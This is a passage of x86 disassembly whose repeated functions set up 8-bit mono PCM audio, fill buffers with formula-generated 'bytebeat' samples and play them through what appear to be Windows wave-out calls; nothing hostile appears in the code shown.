  40492b:	83 ec 18             	sub    $0x18,%esp
  40492e:	c7 85 de 59 f1 ff 00 	movl   $0x0,-0xea622(%ebp)
  404935:	00 00 00 
  404938:	8d 85 e2 59 f1 ff    	lea    -0xea61e(%ebp),%eax
  40493e:	ba fc a5 0e 00       	mov    $0xea5fc,%edx
  404943:	89 54 24 08          	mov    %edx,0x8(%esp)
  404947:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40494e:	00 
  40494f:	89 04 24             	mov    %eax,(%esp)
  404952:	e8 f1 24 00 00       	call   0x406e48
  404957:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40495e:	81 7d f4 ff a5 0e 00 	cmpl   $0xea5ff,-0xc(%ebp)
  404965:	77 50                	ja     0x4049b7
  404967:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40496a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40496d:	89 c1                	mov    %eax,%ecx
  40496f:	d3 ea                	shr    %cl,%edx
  404971:	89 d0                	mov    %edx,%eax
  404973:	23 45 f4             	and    -0xc(%ebp),%eax
  404976:	ba 37 00 00 00       	mov    $0x37,%edx
  40497b:	0f af c2             	imul   %edx,%eax
  40497e:	89 c2                	mov    %eax,%edx
  404980:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404983:	c1 e8 0e             	shr    $0xe,%eax
  404986:	83 e0 0e             	and    $0xe,%eax
  404989:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40498c:	0f af c1             	imul   %ecx,%eax
  40498f:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  404992:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404995:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404998:	89 c1                	mov    %eax,%ecx
  40499a:	d3 ea                	shr    %cl,%edx
  40499c:	89 d0                	mov    %edx,%eax
  40499e:	29 c3                	sub    %eax,%ebx
  4049a0:	89 d8                	mov    %ebx,%eax
  4049a2:	89 c1                	mov    %eax,%ecx
  4049a4:	8d 95 de 59 f1 ff    	lea    -0xea622(%ebp),%edx
  4049aa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4049ad:	01 d0                	add    %edx,%eax
  4049af:	88 08                	mov    %cl,(%eax)
  4049b1:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4049b5:	eb a7                	jmp    0x40495e
  4049b7:	8d 85 be 59 f1 ff    	lea    -0xea642(%ebp),%eax
  4049bd:	b9 20 00 00 00       	mov    $0x20,%ecx
  4049c2:	bb 00 00 00 00       	mov    $0x0,%ebx
  4049c7:	89 18                	mov    %ebx,(%eax)
  4049c9:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  4049cd:	8d 50 04             	lea    0x4(%eax),%edx
  4049d0:	83 e2 fc             	and    $0xfffffffc,%edx
  4049d3:	29 d0                	sub    %edx,%eax
  4049d5:	01 c1                	add    %eax,%ecx
  4049d7:	83 e1 fc             	and    $0xfffffffc,%ecx
  4049da:	83 e1 fc             	and    $0xfffffffc,%ecx
  4049dd:	b8 00 00 00 00       	mov    $0x0,%eax
  4049e2:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  4049e5:	83 c0 04             	add    $0x4,%eax
  4049e8:	39 c8                	cmp    %ecx,%eax
  4049ea:	72 f6                	jb     0x4049e2
  4049ec:	01 c2                	add    %eax,%edx
  4049ee:	c7 85 c2 59 f1 ff 00 	movl   $0xea600,-0xea63e(%ebp)
  4049f5:	a6 0e 00 
  4049f8:	8d 85 de 59 f1 ff    	lea    -0xea622(%ebp),%eax
  4049fe:	89 85 be 59 f1 ff    	mov    %eax,-0xea642(%ebp)
  404a04:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a07:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404a0e:	00 
  404a0f:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404a15:	89 54 24 04          	mov    %edx,0x4(%esp)
  404a19:	89 04 24             	mov    %eax,(%esp)
  404a1c:	a1 14 a3 40 00       	mov    0x40a314,%eax
  404a21:	ff d0                	call   *%eax
  404a23:	83 ec 0c             	sub    $0xc,%esp
  404a26:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a29:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404a30:	00 
  404a31:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404a37:	89 54 24 04          	mov    %edx,0x4(%esp)
  404a3b:	89 04 24             	mov    %eax,(%esp)
  404a3e:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404a43:	ff d0                	call   *%eax
  404a45:	83 ec 0c             	sub    $0xc,%esp
  404a48:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a4b:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404a52:	00 
  404a53:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  404a59:	89 54 24 04          	mov    %edx,0x4(%esp)
  404a5d:	89 04 24             	mov    %eax,(%esp)
  404a60:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404a65:	ff d0                	call   *%eax
  404a67:	83 ec 0c             	sub    $0xc,%esp
  404a6a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a6d:	89 04 24             	mov    %eax,(%esp)
  404a70:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  404a75:	ff d0                	call   *%eax
  404a77:	83 ec 04             	sub    $0x4,%esp
  404a7a:	90                   	nop
  404a7b:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  404a7e:	c9                   	leave
  404a7f:	c3                   	ret
  404a80:	55                   	push   %ebp
  404a81:	89 e5                	mov    %esp,%ebp
  404a83:	53                   	push   %ebx
  404a84:	b8 24 4d 0a 00       	mov    $0xa4d24,%eax
  404a89:	e8 42 21 00 00       	call   0x406bd0
  404a8e:	29 c4                	sub    %eax,%esp
  404a90:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404a97:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  404a9d:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  404aa3:	c7 45 e2 22 56 00 00 	movl   $0x5622,-0x1e(%ebp)
  404aaa:	c7 45 e6 22 56 00 00 	movl   $0x5622,-0x1a(%ebp)
  404ab1:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  404ab7:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  404abd:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  404ac3:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404aca:	00 
  404acb:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404ad2:	00 
  404ad3:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404ada:	00 
  404adb:	8d 45 de             	lea    -0x22(%ebp),%eax
  404ade:	89 44 24 08          	mov    %eax,0x8(%esp)
  404ae2:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404ae9:	ff 
  404aea:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404aed:	89 04 24             	mov    %eax,(%esp)
  404af0:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404af5:	ff d0                	call   *%eax
  404af7:	83 ec 18             	sub    $0x18,%esp
  404afa:	c7 85 26 b3 f5 ff 00 	movl   $0x0,-0xa4cda(%ebp)
  404b01:	00 00 00 
  404b04:	8d 85 2a b3 f5 ff    	lea    -0xa4cd6(%ebp),%eax
  404b0a:	ba b4 4c 0a 00       	mov    $0xa4cb4,%edx
  404b0f:	89 54 24 08          	mov    %edx,0x8(%esp)
  404b13:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404b1a:	00 
  404b1b:	89 04 24             	mov    %eax,(%esp)
  404b1e:	e8 25 23 00 00       	call   0x406e48
  404b23:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  404b2a:	81 7d f4 b7 4c 0a 00 	cmpl   $0xa4cb7,-0xc(%ebp)
  404b31:	77 66                	ja     0x404b99
  404b33:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404b36:	25 ff 0f 00 00       	and    $0xfff,%eax
  404b3b:	89 c2                	mov    %eax,%edx
  404b3d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404b40:	c1 e8 0d             	shr    $0xd,%eax
  404b43:	23 45 f4             	and    -0xc(%ebp),%eax
  404b46:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  404b4a:	23 45 f4             	and    -0xc(%ebp),%eax
  404b4d:	0f af c2             	imul   %edx,%eax
  404b50:	c1 e8 0c             	shr    $0xc,%eax
  404b53:	89 c3                	mov    %eax,%ebx
  404b55:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404b58:	c1 e8 08             	shr    $0x8,%eax
  404b5b:	89 c2                	mov    %eax,%edx
  404b5d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404b60:	c1 e8 05             	shr    $0x5,%eax
  404b63:	21 d0                	and    %edx,%eax
  404b65:	25 ea 00 00 00       	and    $0xea,%eax
  404b6a:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  404b6e:	89 c2                	mov    %eax,%edx
  404b70:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404b73:	c1 e8 0e             	shr    $0xe,%eax
  404b76:	23 45 f4             	and    -0xc(%ebp),%eax
  404b79:	89 c1                	mov    %eax,%ecx
  404b7b:	d3 ea                	shr    %cl,%edx
  404b7d:	89 d0                	mov    %edx,%eax
  404b7f:	83 e0 9a             	and    $0xffffff9a,%eax
  404b82:	01 d8                	add    %ebx,%eax
  404b84:	89 c1                	mov    %eax,%ecx
  404b86:	8d 95 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%edx
  404b8c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404b8f:	01 d0                	add    %edx,%eax
  404b91:	88 08                	mov    %cl,(%eax)
  404b93:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  404b97:	eb 91                	jmp    0x404b2a
  404b99:	8d 85 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%eax
  404b9f:	b9 20 00 00 00       	mov    $0x20,%ecx
  404ba4:	bb 00 00 00 00       	mov    $0x0,%ebx
  404ba9:	89 18                	mov    %ebx,(%eax)
  404bab:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  404baf:	8d 50 04             	lea    0x4(%eax),%edx
  404bb2:	83 e2 fc             	and    $0xfffffffc,%edx
  404bb5:	29 d0                	sub    %edx,%eax
  404bb7:	01 c1                	add    %eax,%ecx
  404bb9:	83 e1 fc             	and    $0xfffffffc,%ecx
  404bbc:	83 e1 fc             	and    $0xfffffffc,%ecx
  404bbf:	b8 00 00 00 00       	mov    $0x0,%eax
  404bc4:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404bc7:	83 c0 04             	add    $0x4,%eax
  404bca:	39 c8                	cmp    %ecx,%eax
  404bcc:	72 f6                	jb     0x404bc4
  404bce:	01 c2                	add    %eax,%edx
  404bd0:	c7 85 0a b3 f5 ff b8 	movl   $0xa4cb8,-0xa4cf6(%ebp)
  404bd7:	4c 0a 00 
  404bda:	8d 85 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%eax
  404be0:	89 85 06 b3 f5 ff    	mov    %eax,-0xa4cfa(%ebp)
  404be6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404be9:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404bf0:	00 
  404bf1:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404bf7:	89 54 24 04          	mov    %edx,0x4(%esp)
  404bfb:	89 04 24             	mov    %eax,(%esp)
  404bfe:	a1 14 a3 40 00       	mov    0x40a314,%eax
  404c03:	ff d0                	call   *%eax
  404c05:	83 ec 0c             	sub    $0xc,%esp
  404c08:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c0b:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404c12:	00 
  404c13:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404c19:	89 54 24 04          	mov    %edx,0x4(%esp)
  404c1d:	89 04 24             	mov    %eax,(%esp)
  404c20:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404c25:	ff d0                	call   *%eax
  404c27:	83 ec 0c             	sub    $0xc,%esp
  404c2a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c2d:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404c34:	00 
  404c35:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404c3b:	89 54 24 04          	mov    %edx,0x4(%esp)
  404c3f:	89 04 24             	mov    %eax,(%esp)
  404c42:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404c47:	ff d0                	call   *%eax
  404c49:	83 ec 0c             	sub    $0xc,%esp
  404c4c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c4f:	89 04 24             	mov    %eax,(%esp)
  404c52:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  404c57:	ff d0                	call   *%eax
  404c59:	83 ec 04             	sub    $0x4,%esp
  404c5c:	90                   	nop
  404c5d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  404c60:	c9                   	leave
  404c61:	c3                   	ret
  404c62:	55                   	push   %ebp
  404c63:	89 e5                	mov    %esp,%ebp
  404c65:	53                   	push   %ebx
  404c66:	b8 24 4d 0a 00       	mov    $0xa4d24,%eax
  404c6b:	e8 60 1f 00 00       	call   0x406bd0
  404c70:	29 c4                	sub    %eax,%esp
  404c72:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404c79:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  404c7f:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  404c85:	c7 45 e2 22 56 00 00 	movl   $0x5622,-0x1e(%ebp)
  404c8c:	c7 45 e6 22 56 00 00 	movl   $0x5622,-0x1a(%ebp)
  404c93:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  404c99:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  404c9f:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  404ca5:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404cac:	00 
  404cad:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404cb4:	00 
  404cb5:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404cbc:	00 
  404cbd:	8d 45 de             	lea    -0x22(%ebp),%eax
  404cc0:	89 44 24 08          	mov    %eax,0x8(%esp)
  404cc4:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404ccb:	ff 
  404ccc:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404ccf:	89 04 24             	mov    %eax,(%esp)
  404cd2:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404cd7:	ff d0                	call   *%eax
  404cd9:	83 ec 18             	sub    $0x18,%esp
  404cdc:	c7 85 26 b3 f5 ff 00 	movl   $0x0,-0xa4cda(%ebp)
  404ce3:	00 00 00 
  404ce6:	8d 85 2a b3 f5 ff    	lea    -0xa4cd6(%ebp),%eax
  404cec:	ba b4 4c 0a 00       	mov    $0xa4cb4,%edx
  404cf1:	89 54 24 08          	mov    %edx,0x8(%esp)
  404cf5:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404cfc:	00 
  404cfd:	89 04 24             	mov    %eax,(%esp)
  404d00:	e8 43 21 00 00       	call   0x406e48
  404d05:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  404d0c:	81 7d f4 b7 4c 0a 00 	cmpl   $0xa4cb7,-0xc(%ebp)
  404d13:	77 5c                	ja     0x404d71
  404d15:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d18:	0f af c0             	imul   %eax,%eax
  404d1b:	c1 e8 02             	shr    $0x2,%eax
  404d1e:	89 c3                	mov    %eax,%ebx
  404d20:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d23:	c1 e8 0a             	shr    $0xa,%eax
  404d26:	23 45 f4             	and    -0xc(%ebp),%eax
  404d29:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  404d2d:	25 de 00 00 00       	and    $0xde,%eax
  404d32:	89 c2                	mov    %eax,%edx
  404d34:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d37:	c1 e8 0e             	shr    $0xe,%eax
  404d3a:	83 e0 05             	and    $0x5,%eax
  404d3d:	89 c1                	mov    %eax,%ecx
  404d3f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d42:	01 c8                	add    %ecx,%eax
  404d44:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  404d48:	25 de 00 00 00       	and    $0xde,%eax
  404d4d:	39 c2                	cmp    %eax,%edx
  404d4f:	0f 92 c0             	setb   %al
  404d52:	0f b6 c0             	movzbl %al,%eax
  404d55:	89 c2                	mov    %eax,%edx
  404d57:	89 d8                	mov    %ebx,%eax
  404d59:	0f af c2             	imul   %edx,%eax
  404d5c:	89 c1                	mov    %eax,%ecx
  404d5e:	8d 95 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%edx
  404d64:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d67:	01 d0                	add    %edx,%eax
  404d69:	88 08                	mov    %cl,(%eax)
  404d6b:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  404d6f:	eb 9b                	jmp    0x404d0c
  404d71:	8d 85 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%eax
  404d77:	b9 20 00 00 00       	mov    $0x20,%ecx
  404d7c:	bb 00 00 00 00       	mov    $0x0,%ebx
  404d81:	89 18                	mov    %ebx,(%eax)
  404d83:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  404d87:	8d 50 04             	lea    0x4(%eax),%edx
  404d8a:	83 e2 fc             	and    $0xfffffffc,%edx
  404d8d:	29 d0                	sub    %edx,%eax
  404d8f:	01 c1                	add    %eax,%ecx
  404d91:	83 e1 fc             	and    $0xfffffffc,%ecx
  404d94:	83 e1 fc             	and    $0xfffffffc,%ecx
  404d97:	b8 00 00 00 00       	mov    $0x0,%eax
  404d9c:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404d9f:	83 c0 04             	add    $0x4,%eax
  404da2:	39 c8                	cmp    %ecx,%eax
  404da4:	72 f6                	jb     0x404d9c
  404da6:	01 c2                	add    %eax,%edx
  404da8:	c7 85 0a b3 f5 ff b8 	movl   $0xa4cb8,-0xa4cf6(%ebp)
  404daf:	4c 0a 00 
  404db2:	8d 85 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%eax
  404db8:	89 85 06 b3 f5 ff    	mov    %eax,-0xa4cfa(%ebp)
  404dbe:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404dc1:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404dc8:	00 
  404dc9:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404dcf:	89 54 24 04          	mov    %edx,0x4(%esp)
  404dd3:	89 04 24             	mov    %eax,(%esp)
  404dd6:	a1 14 a3 40 00       	mov    0x40a314,%eax
  404ddb:	ff d0                	call   *%eax
  404ddd:	83 ec 0c             	sub    $0xc,%esp
  404de0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404de3:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404dea:	00 
  404deb:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404df1:	89 54 24 04          	mov    %edx,0x4(%esp)
  404df5:	89 04 24             	mov    %eax,(%esp)
  404df8:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404dfd:	ff d0                	call   *%eax
  404dff:	83 ec 0c             	sub    $0xc,%esp
  404e02:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e05:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404e0c:	00 
  404e0d:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404e13:	89 54 24 04          	mov    %edx,0x4(%esp)
  404e17:	89 04 24             	mov    %eax,(%esp)
  404e1a:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404e1f:	ff d0                	call   *%eax
  404e21:	83 ec 0c             	sub    $0xc,%esp
  404e24:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e27:	89 04 24             	mov    %eax,(%esp)
  404e2a:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  404e2f:	ff d0                	call   *%eax
  404e31:	83 ec 04             	sub    $0x4,%esp
  404e34:	90                   	nop
  404e35:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  404e38:	c9                   	leave
  404e39:	c3                   	ret
  404e3a:	55                   	push   %ebp
  404e3b:	89 e5                	mov    %esp,%ebp
  404e3d:	53                   	push   %ebx
  404e3e:	b8 24 4d 0a 00       	mov    $0xa4d24,%eax
  404e43:	e8 88 1d 00 00       	call   0x406bd0
  404e48:	29 c4                	sub    %eax,%esp
  404e4a:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  404e51:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  404e57:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  404e5d:	c7 45 e2 22 56 00 00 	movl   $0x5622,-0x1e(%ebp)
  404e64:	c7 45 e6 22 56 00 00 	movl   $0x5622,-0x1a(%ebp)
  404e6b:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  404e71:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  404e77:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  404e7d:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404e84:	00 
  404e85:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404e8c:	00 
  404e8d:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  404e94:	00 
  404e95:	8d 45 de             	lea    -0x22(%ebp),%eax
  404e98:	89 44 24 08          	mov    %eax,0x8(%esp)
  404e9c:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404ea3:	ff 
  404ea4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404ea7:	89 04 24             	mov    %eax,(%esp)
  404eaa:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404eaf:	ff d0                	call   *%eax
  404eb1:	83 ec 18             	sub    $0x18,%esp
  404eb4:	c7 85 26 b3 f5 ff 00 	movl   $0x0,-0xa4cda(%ebp)
  404ebb:	00 00 00 
  404ebe:	8d 85 2a b3 f5 ff    	lea    -0xa4cd6(%ebp),%eax
  404ec4:	ba b4 4c 0a 00       	mov    $0xa4cb4,%edx
  404ec9:	89 54 24 08          	mov    %edx,0x8(%esp)
  404ecd:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404ed4:	00 
  404ed5:	89 04 24             	mov    %eax,(%esp)
  404ed8:	e8 6b 1f 00 00       	call   0x406e48
  404edd:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  404ee4:	81 7d f4 b7 4c 0a 00 	cmpl   $0xa4cb7,-0xc(%ebp)
  404eeb:	77 5f                	ja     0x404f4c
  404eed:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404ef0:	01 c0                	add    %eax,%eax
  404ef2:	c1 e8 08             	shr    $0x8,%eax
  404ef5:	89 c2                	mov    %eax,%edx
  404ef7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404efa:	0f af c0             	imul   %eax,%eax
  404efd:	c1 e8 09             	shr    $0x9,%eax
  404f00:	09 d0                	or     %edx,%eax
  404f02:	89 c1                	mov    %eax,%ecx
  404f04:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f07:	89 c2                	mov    %eax,%edx
  404f09:	89 c8                	mov    %ecx,%eax
  404f0b:	0f af c2             	imul   %edx,%eax
  404f0e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404f11:	c1 ea 06             	shr    $0x6,%edx
  404f14:	21 d0                	and    %edx,%eax
  404f16:	89 c1                	mov    %eax,%ecx
  404f18:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f1b:	c1 e8 0d             	shr    $0xd,%eax
  404f1e:	23 45 f4             	and    -0xc(%ebp),%eax
  404f21:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404f24:	c1 ea 06             	shr    $0x6,%edx
  404f27:	09 d0                	or     %edx,%eax
  404f29:	89 c3                	mov    %eax,%ebx
  404f2b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f2e:	89 c2                	mov    %eax,%edx
  404f30:	89 d8                	mov    %ebx,%eax
  404f32:	0f af c2             	imul   %edx,%eax
  404f35:	21 c8                	and    %ecx,%eax
  404f37:	89 c1                	mov    %eax,%ecx
  404f39:	8d 95 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%edx
  404f3f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f42:	01 d0                	add    %edx,%eax
  404f44:	88 08                	mov    %cl,(%eax)
  404f46:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  404f4a:	eb 98                	jmp    0x404ee4
  404f4c:	8d 85 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%eax
  404f52:	b9 20 00 00 00       	mov    $0x20,%ecx
  404f57:	bb 00 00 00 00       	mov    $0x0,%ebx
  404f5c:	89 18                	mov    %ebx,(%eax)
  404f5e:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  404f62:	8d 50 04             	lea    0x4(%eax),%edx
  404f65:	83 e2 fc             	and    $0xfffffffc,%edx
  404f68:	29 d0                	sub    %edx,%eax
  404f6a:	01 c1                	add    %eax,%ecx
  404f6c:	83 e1 fc             	and    $0xfffffffc,%ecx
  404f6f:	83 e1 fc             	and    $0xfffffffc,%ecx
  404f72:	b8 00 00 00 00       	mov    $0x0,%eax
  404f77:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  404f7a:	83 c0 04             	add    $0x4,%eax
  404f7d:	39 c8                	cmp    %ecx,%eax
  404f7f:	72 f6                	jb     0x404f77
  404f81:	01 c2                	add    %eax,%edx
  404f83:	c7 85 0a b3 f5 ff b8 	movl   $0xa4cb8,-0xa4cf6(%ebp)
  404f8a:	4c 0a 00 
  404f8d:	8d 85 26 b3 f5 ff    	lea    -0xa4cda(%ebp),%eax
  404f93:	89 85 06 b3 f5 ff    	mov    %eax,-0xa4cfa(%ebp)
  404f99:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f9c:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404fa3:	00 
  404fa4:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404faa:	89 54 24 04          	mov    %edx,0x4(%esp)
  404fae:	89 04 24             	mov    %eax,(%esp)
  404fb1:	a1 14 a3 40 00       	mov    0x40a314,%eax
  404fb6:	ff d0                	call   *%eax
  404fb8:	83 ec 0c             	sub    $0xc,%esp
  404fbb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404fbe:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404fc5:	00 
  404fc6:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404fcc:	89 54 24 04          	mov    %edx,0x4(%esp)
  404fd0:	89 04 24             	mov    %eax,(%esp)
  404fd3:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  404fd8:	ff d0                	call   *%eax
  404fda:	83 ec 0c             	sub    $0xc,%esp
  404fdd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404fe0:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  404fe7:	00 
  404fe8:	8d 95 06 b3 f5 ff    	lea    -0xa4cfa(%ebp),%edx
  404fee:	89 54 24 04          	mov    %edx,0x4(%esp)
  404ff2:	89 04 24             	mov    %eax,(%esp)
  404ff5:	a1 18 a3 40 00       	mov    0x40a318,%eax
  404ffa:	ff d0                	call   *%eax
  404ffc:	83 ec 0c             	sub    $0xc,%esp
  404fff:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405002:	89 04 24             	mov    %eax,(%esp)
  405005:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  40500a:	ff d0                	call   *%eax
  40500c:	83 ec 04             	sub    $0x4,%esp
  40500f:	90                   	nop
  405010:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  405013:	c9                   	leave
  405014:	c3                   	ret
  405015:	55                   	push   %ebp
  405016:	89 e5                	mov    %esp,%ebp
  405018:	53                   	push   %ebx
  405019:	b8 64 a6 0e 00       	mov    $0xea664,%eax
  40501e:	e8 ad 1b 00 00       	call   0x406bd0
  405023:	29 c4                	sub    %eax,%esp
  405025:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40502c:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  405032:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  405038:	c7 45 e2 00 7d 00 00 	movl   $0x7d00,-0x1e(%ebp)
  40503f:	c7 45 e6 00 7d 00 00 	movl   $0x7d00,-0x1a(%ebp)
  405046:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  40504c:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  405052:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
